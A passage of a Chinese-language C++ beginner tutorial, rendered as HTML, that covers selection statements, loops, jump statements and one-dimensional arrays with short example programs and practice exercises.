&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;我考上了清华&quot;</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;我考上了人大&quot;</span> &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (score &gt; <span class="number">500</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;我考上了二本大学&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (score &gt; <span class="number">400</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;我考上了三本大学&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;我未考上本科&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>







<p><strong>练习案例：</strong> 三只小猪称体重</p>
<p>有三只小猪ABC，请分别输入三只小猪的体重，并且判断哪只小猪最重？<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E4%B8%89%E5%8F%AA%E5%B0%8F%E7%8C%AA.jpg"
                      alt="三只小猪"
                ></p>
<h4 id="4-1-2-三目运算符"><a href="#4-1-2-三目运算符" class="headerlink" title="4.1.2 三目运算符"></a>4.1.2 三目运算符</h4><p><strong>作用：</strong> 通过三目运算符实现简单的判断</p>
<p><strong>语法：</strong><code>表达式1 ? 表达式2 ：表达式3</code></p>
<p><strong>解释：</strong></p>
<p>如果表达式1的值为真，执行表达式2，并返回表达式2的结果；</p>
<p>如果表达式1的值为假，执行表达式3，并返回表达式3的结果。</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line">	<span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	c = a &gt; b ? a : b;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;c = &quot;</span> &lt;&lt; c &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//C++中三目运算符返回的是变量,可以继续赋值</span></span><br><span class="line"></span><br><span class="line">	(a &gt; b ? a : b) = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a = &quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;b = &quot;</span> &lt;&lt; b &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;c = &quot;</span> &lt;&lt; c &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>总结：和if语句比较，三目运算符优点是短小整洁，缺点是如果用嵌套，结构不清晰</p>
</blockquote>
<h4 id="4-1-3-switch语句"><a href="#4-1-3-switch语句" class="headerlink" title="4.1.3 switch语句"></a>4.1.3 switch语句</h4><p><strong>作用：</strong>执行多条件分支语句</p>
<p><strong>语法：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">switch</span>(表达式)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> 结果<span class="number">1</span>：执行语句;<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">case</span> 结果<span class="number">2</span>：执行语句;<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">	<span class="keyword">default</span>:执行语句;<span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>







<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//请给电影评分 </span></span><br><span class="line">	<span class="comment">//10 ~ 9   经典   </span></span><br><span class="line">	<span class="comment">// 8 ~ 7   非常好</span></span><br><span class="line">	<span class="comment">// 6 ~ 5   一般</span></span><br><span class="line">	<span class="comment">// 5分以下 烂片</span></span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> score = <span class="number">0</span>;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请给电影打分&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cin &gt;&gt; score;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (score)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">	<span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;经典&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;非常好&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">	<span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;一般&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">default</span>:</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;烂片&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>注意1：switch语句中表达式类型只能是整型或者字符型</p>
</blockquote>
<blockquote>
<p>注意2：case里如果没有break，那么程序会一直向下执行</p>
</blockquote>
<blockquote>
<p>总结：与if语句比，对于多条件判断时，switch的结构清晰，执行效率高，缺点是switch不可以判断区间</p>
</blockquote>
<h3 id="4-2-循环结构"><a href="#4-2-循环结构" class="headerlink" title="4.2 循环结构"></a>4.2 循环结构</h3><h4 id="4-2-1-while循环语句"><a href="#4-2-1-while循环语句" class="headerlink" title="4.2.1 while循环语句"></a>4.2.1 while循环语句</h4><p><strong>作用：</strong>满足循环条件，执行循环语句</p>
<p><strong>语法：</strong><code> while(循环条件)&#123; 循环语句 &#125;</code></p>
<p><strong>解释：</strong>&#x3D;&#x3D;只要循环条件的结果为真，就执行循环语句&#x3D;&#x3D;</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/clip_image002-1541668640382.png"
                      alt="img"
                ></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span> (num &lt; <span class="number">10</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;num = &quot;</span> &lt;&lt; num &lt;&lt; endl;</span><br><span class="line">		num++;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>注意：在执行循环语句时候，程序必须提供跳出循环的出口，否则出现死循环</p>
</blockquote>
<p><strong>while循环练习案例：</strong>&#x3D;&#x3D;猜数字&#x3D;&#x3D;</p>
<p><strong>案例描述：</strong>系统随机生成一个1到100之间的数字，玩家进行猜测，如果猜错，提示玩家数字过大或过小，如果猜对恭喜玩家胜利，并且退出游戏。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/%E7%8C%9C%E6%95%B0%E5%AD%97.jpg"
                      alt="猜数字"
                ></p>
<h4 id="4-2-2-do…while循环语句"><a href="#4-2-2-do…while循环语句" class="headerlink" title="4.2.2 do…while循环语句"></a>4.2.2 do…while循环语句</h4><p><strong>作用：</strong> 满足循环条件，执行循环语句</p>
<p><strong>语法：</strong> <code>do&#123; 循环语句 &#125; while(循环条件);</code></p>
<p><strong>注意：</strong>与while的区别在于&#x3D;&#x3D;do…while会先执行一次循环语句&#x3D;&#x3D;，再判断循环条件</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/clip_image002-1541671163478.png"
                      alt="img"
                ></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; num &lt;&lt; endl;</span><br><span class="line">		num++;</span><br><span class="line"></span><br><span class="line">	&#125; <span class="keyword">while</span> (num &lt; <span class="number">10</span>);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结：与while循环区别在于，do…while先执行一次循环语句，再判断循环条件</p>
</blockquote>
<p><strong>练习案例：水仙花数</strong></p>
<p><strong>案例描述：</strong>水仙花数是指一个 3 位数，它的每个位上的数字的 3次幂之和等于它本身</p>
<p>例如：1^3 + 5^3+ 3^3 &#x3D; 153</p>
<p>请利用do…while语句，求出所有3位数中的水仙花数</p>
<h4 id="4-2-3-for循环语句"><a href="#4-2-3-for循环语句" class="headerlink" title="4.2.3 for循环语句"></a>4.2.3 for循环语句</h4><p><strong>作用：</strong> 满足循环条件，执行循环语句</p>
<p><strong>语法：</strong><code> for(起始表达式;条件表达式;末尾循环体) &#123; 循环语句; &#125;</code></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>







<p><strong>详解：</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1541673704101.png"
                      alt="1541673704101"
                ></p>
<blockquote>
<p>注意：for循环中的表达式，要用分号进行分隔</p>
</blockquote>
<blockquote>
<p>总结：while , do…while, for都是开发中常用的循环语句，for循环结构比较清晰，比较常用</p>
</blockquote>
<p><strong>练习案例：敲桌子</strong></p>
<p>案例描述：从1开始数到数字100， 如果数字个位含有7，或者数字十位含有7，或者该数字是7的倍数，我们打印敲桌子，其余数字直接打印输出。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/timg.gif"
                      alt="timg"
                ></p>
<h4 id="4-2-4-嵌套循环"><a href="#4-2-4-嵌套循环" class="headerlink" title="4.2.4 嵌套循环"></a>4.2.4 嵌套循环</h4><p><strong>作用：</strong> 在循环体中再嵌套一层循环，解决一些实际问题</p>
<p>例如我们想在屏幕中打印如下图片，就需要利用嵌套循环</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1541676003486.png"
                      alt="1541676003486"
                ></p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//外层循环执行1次，内层循环执行1轮</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>













<p><strong>练习案例：</strong>乘法口诀表</p>
<p>案例描述：利用嵌套循环，实现九九乘法表</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/0006018857256120_b.jpg"
                      alt="0006018857256120_b"
                ></p>
<h3 id="4-3-跳转语句"><a href="#4-3-跳转语句" class="headerlink" title="4.3 跳转语句"></a>4.3 跳转语句</h3><h4 id="4-3-1-break语句"><a href="#4-3-1-break语句" class="headerlink" title="4.3.1 break语句"></a>4.3.1 break语句</h4><p><strong>作用:</strong> 用于跳出&#x3D;&#x3D;选择结构&#x3D;&#x3D;或者&#x3D;&#x3D;循环结构&#x3D;&#x3D;</p>
<p>break使用的时机：</p>
<ul>
<li>出现在switch条件语句中，作用是终止case并跳出switch</li>
<li>出现在循环语句中，作用是跳出当前的循环语句</li>
<li>出现在嵌套循环中，跳出最近的内层循环语句</li>
</ul>
<p><strong>示例1：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//1、在switch 语句中使用break</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;请选择您挑战副本的难度：&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;1、普通&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;2、中等&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;3、困难&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> num = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	cin &gt;&gt; num;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">switch</span> (num)</span><br><span class="line">	&#123;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;您选择的是普通难度&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;您选择的是中等难度&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;您选择的是困难难度&quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">break</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>示例2：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//2、在循环语句中用break</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (i == <span class="number">5</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">break</span>; <span class="comment">//跳出循环语句</span></span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p><strong>示例3：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="comment">//在嵌套循环语句中使用break，退出内层循环</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">10</span>; j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (j == <span class="number">5</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;*&quot;</span> &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>















<h4 id="4-3-2-continue语句"><a href="#4-3-2-continue语句" class="headerlink" title="4.3.2 continue语句"></a>4.3.2 continue语句</h4><p><strong>作用：</strong>在&#x3D;&#x3D;循环语句&#x3D;&#x3D;中，跳过本次循环中余下尚未执行的语句，继续执行下一次循环</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">100</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span> (i % <span class="number">2</span> == <span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; i &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>注意：continue并没有使整个循环终止，而break会跳出循环</p>
</blockquote>
<h4 id="4-3-3-goto语句"><a href="#4-3-3-goto语句" class="headerlink" title="4.3.3 goto语句"></a>4.3.3 goto语句</h4><p><strong>作用：</strong>可以无条件跳转语句</p>
<p><strong>语法：</strong> <code>goto 标记;</code></p>
<p><strong>解释：</strong>如果标记的名称存在，执行到goto语句时，会跳转到标记的位置</p>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;1&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">goto</span> FLAG;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;2&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;3&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;4&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	FLAG:</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;5&quot;</span> &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>注意：在程序中不建议使用goto语句，以免造成程序流程混乱</p>
</blockquote>
<h2 id="5-数组"><a href="#5-数组" class="headerlink" title="5 数组"></a>5 数组</h2><h3 id="5-1-概述"><a href="#5-1-概述" class="headerlink" title="5.1 概述"></a>5.1 概述</h3><p>所谓数组，就是一个集合，里面存放了相同类型的数据元素</p>
<p><strong>特点1：</strong>数组中的每个&#x3D;&#x3D;数据元素都是相同的数据类型&#x3D;&#x3D;</p>
<p><strong>特点2：</strong>数组是由&#x3D;&#x3D;连续的内存&#x3D;&#x3D;位置组成的</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/../../../source/images/C++%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/1541748375356.png"
                      alt="1541748375356"
                ></p>
<h3 id="5-2-一维数组"><a href="#5-2-一维数组" class="headerlink" title="5.2 一维数组"></a>5.2 一维数组</h3><h4 id="5-2-1-一维数组定义方式"><a href="#5-2-1-一维数组定义方式" class="headerlink" title="5.2.1 一维数组定义方式"></a>5.2.1 一维数组定义方式</h4><p>一维数组定义的三种方式：</p>
<ol>
<li><code>数据类型  数组名[ 数组长度 ];</code></li>
<li><code>数据类型  数组名[ 数组长度 ] = &#123; 值1，值2 ...&#125;;</code></li>
<li><code>数据类型  数组名[ ] = &#123; 值1，值2 ...&#125;;</code></li>
</ol>
<p>示例</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//定义方式1</span></span><br><span class="line">	<span class="comment">//数据类型 数组名[元素个数];</span></span><br><span class="line">	<span class="type">int</span> score[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line">	<span class="comment">//利用下标赋值</span></span><br><span class="line">	score[<span class="number">0</span>] = <span class="number">100</span>;</span><br><span class="line">	score[<span class="number">1</span>] = <span class="number">99</span>;</span><br><span class="line">	score[<span class="number">2</span>] = <span class="number">85</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//利用下标输出</span></span><br><span class="line">	cout &lt;&lt; score[<span class="number">0</span>] &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; score[<span class="number">1</span>] &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; score[<span class="number">2</span>] &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//第二种定义方式</span></span><br><span class="line">	<span class="comment">//数据类型 数组名[元素个数] =  &#123;值1，值2 ，值3 ...&#125;;</span></span><br><span class="line">	<span class="comment">//如果&#123;&#125;内不足10个数据，剩余数据用0补全</span></span><br><span class="line">	<span class="type">int</span> score2[<span class="number">10</span>] = &#123; <span class="number">100</span>, <span class="number">90</span>,<span class="number">80</span>,<span class="number">70</span>,<span class="number">60</span>,<span class="number">50</span>,<span class="number">40</span>,<span class="number">30</span>,<span class="number">20</span>,<span class="number">10</span> &#125;;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//逐个输出</span></span><br><span class="line">	<span class="comment">//cout &lt;&lt; score2[0] &lt;&lt; endl;</span></span><br><span class="line">	<span class="comment">//cout &lt;&lt; score2[1] &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//一个一个输出太麻烦，因此可以利用循环进行输出</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; score2[i] &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//定义方式3</span></span><br><span class="line">	<span class="comment">//数据类型 数组名[] =  &#123;值1，值2 ，值3 ...&#125;;</span></span><br><span class="line">	<span class="type">int</span> score3[] = &#123; <span class="number">100</span>,<span class="number">90</span>,<span class="number">80</span>,<span class="number">70</span>,<span class="number">60</span>,<span class="number">50</span>,<span class="number">40</span>,<span class="number">30</span>,<span class="number">20</span>,<span class="number">10</span> &#125;;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; score3[i] &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<blockquote>
<p>总结1：数组名的命名规范与变量名命名规范一致，不要和变量重名</p>
</blockquote>
<blockquote>
<p>总结2：数组中下标是从0开始索引</p>
</blockquote>
<h4 id="5-2-2-一维数组数组名"><a href="#5-2-2-一维数组数组名" class="headerlink" title="5.2.2 一维数组数组名"></a>5.2.2 一维数组数组名</h4><p>一维数组名称的<strong>用途</strong>：</p>
<ol>
<li>可以统计整个数组在内存中的长度</li>
<li>可以获取数组在内存中的首地址</li>
</ol>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//数组名用途</span></span><br><span class="line">	<span class="comment">//1、可以获取整个数组占用内存空间大小</span></span><br><span class="line">	<span class="type">int</span> arr[<span class="number">10</span>] = &#123; <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> &#125;;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;整个数组所占内存空间为： &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(arr) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;每个元素所占内存空间为： &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(arr[<span class="number">0</span>]) &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;数组的元素个数为： &quot;</span> &lt;&lt; <span class="built_in">sizeof</span>(arr) / <span class="built_in">sizeof</span>(arr[<span class="number">0</span>]) &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//2、可以通过数组名获取到数组首地址</span></span><br><span class="line">	cout &lt;&lt; <span 